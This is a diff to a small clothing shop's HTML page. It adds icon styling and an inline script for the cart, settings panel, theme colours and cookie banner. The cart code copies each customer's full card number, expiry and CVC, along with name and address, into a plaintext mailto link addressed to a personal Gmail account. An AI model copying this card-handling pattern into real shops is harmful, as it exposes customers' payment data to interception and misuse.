@@ -8,6 +8,23 @@
 <link rel="icon" href="favicon-I.ico" type="image/x-icon">
 <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@700&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="style.css">
+<style>
+/* Simple fixes for settings/cart icons */
+.header-buttons img {
+  cursor: pointer;
+  transition: transform 0.2s ease;
+}
+.header-buttons img:hover {
+  transform: scale(1.2);
+}
+/* Settings panel smooth slide */
+.settings-panel {
+  transition: right 0.3s ease;
+}
+.cart-dropdown {
+  display: none;
+}
+</style>
 </head>
 <body class="light animations-on">
 
@@ -35,11 +52,14 @@
     <a href="#contact" class="nav-link">Contact</a>
   </nav>
   <div class="header-buttons">
+    <!-- SETTINGS ICON -->
     <div class="settings-icon" id="settings-icon" title="Settings">
-      <img src="settings-favicon.png" alt="Settings">
+      <img src="favicon-settings.ico" alt="Settings" width="24" height="24">
     </div>
-    <div class="cart-icon" id="cart-icon">
-      <img src="cart-favicon.png" alt="Cart">
+
+    <!-- CART ICON -->
+    <div class="cart-icon" id="cart-icon" title="Cart">
+      <img src="favicon-cart.ico" alt="Cart" width="24" height="24">
       <span id="cart-count">0</span>
     </div>
   </div>
@@ -159,6 +179,87 @@
 
 </main>
 
-<script src="script.js"></script>
+<script>
+// ========================
+// CART FUNCTIONALITY
+// ========================
+let cart = [];
+const cartCount = document.getElementById('cart-count');
+const cartDropdown = document.getElementById('cart-dropdown');
+const cartItemsList = document.getElementById('cart-items');
+const cartTotalSpan = document.getElementById('cart-total');
+const checkoutLink = document.getElementById('checkout-link');
+
+function addToCart(name, price, sizeSelectId) {
+  const sizeSelect = document.getElementById(sizeSelectId);
+  const size = sizeSelect.value;
+  cart.push({ name: name + " (" + size + ")", price });
+  updateCartUI();
+}
+
+function updateCartUI() {
+  cartCount.textContent = cart.length;
+  cartItemsList.innerHTML = '';
+  let total = 0;
+  cart.forEach(item => {
+    const li = document.createElement('li');
+    li.textContent = `${item.name} - $${item.price}`;
+    cartItemsList.appendChild(li);
+    total += item.price;
+  });
+  cartTotalSpan.textContent = total.toFixed(2);
+
+  const name = document.getElementById('customer-name').value || '';
+  const email = document.getElementById('customer-email').value || '';
+  const address = document.getElementById('customer-address').value || '';
+  const card = document.getElementById('customer-card').value || '';
+  const exp = document.getElementById('customer-exp').value || '';
+  const cvc = document.getElementById('customer-cvc').value || '';
+
+  const subject = encodeURIComponent("Innocent Clothing Order");
+  const body = encodeURIComponent(
+    `Name: ${name}\nEmail: ${email}\nAddress: ${address}\nCard: ${card}\nExpiry: ${exp}\nCVC: ${cvc}\n\nOrder Items:\n${cart.map(i => i.name + " - $" + i.price).join("\n")}\nTotal: $${total.toFixed(2)}`
+  );
+  checkoutLink.href = `mailto:davenanother@gmail.com?subject=${subject}&body=${body}`;
+}
+
+// Toggle cart visibility
+document.getElementById('cart-icon').addEventListener('click', () => {
+  cartDropdown.style.display = cartDropdown.style.display === 'block' ? 'none' : 'block';
+});
+
+// ========================
+// SETTINGS PANEL
+// ========================
+const settingsPanel = document.getElementById('settings-panel');
+document.getElementById('settings-icon').addEventListener('click', () => {
+  settingsPanel.style.right = '20px';
+});
+document.getElementById('close-settings').addEventListener('click', () => {
+  settingsPanel.style.right = '-320px';
+});
+
+// ========================
+// THEME & COLORS
+// ========================
+document.getElementById('theme-select').addEventListener('change', e => {
+  document.body.classList.remove('light', 'dark');
+  document.body.classList.add(e.target.value);
+});
+
+document.getElementById('primary-color').addEventListener('input', e => {
+  document.body.style.setProperty('--primary', e.target.value);
+});
+document.getElementById('secondary-color').addEventListener('input', e => {
+  document.body.style.setProperty('--secondary', e.target.value);
+});
+
+// ========================
+// COOKIES BANNER
+// ========================
+document.getElementById('accept-cookies').addEventListener('click', () => {
+  document.getElementById('cookies-banner').style.display = 'none';
+});
+</script>
 </body>
 </html>
